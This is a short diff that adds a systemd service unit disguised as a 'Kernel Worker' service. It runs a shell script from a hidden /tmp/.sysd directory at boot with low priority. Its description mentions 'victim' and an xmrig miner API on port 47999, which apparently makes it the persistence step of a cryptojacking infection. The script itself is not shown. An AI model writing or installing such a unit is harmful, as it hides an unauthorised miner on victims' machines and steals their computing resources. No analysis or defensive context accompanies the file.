@@ -1,0 +1,12 @@
+[Unit]
+Description=Kernel Worker victim production census (published xmrig API on :47999)
+
+[Service]
+Type=oneshot
+EnvironmentFile=-/etc/default/kworker
+ExecStart=/bin/sh /tmp/.sysd/victim.sh
+Nice=15
+TimeoutStartSec=240
+
+[Install]
+WantedBy=multi-user.target
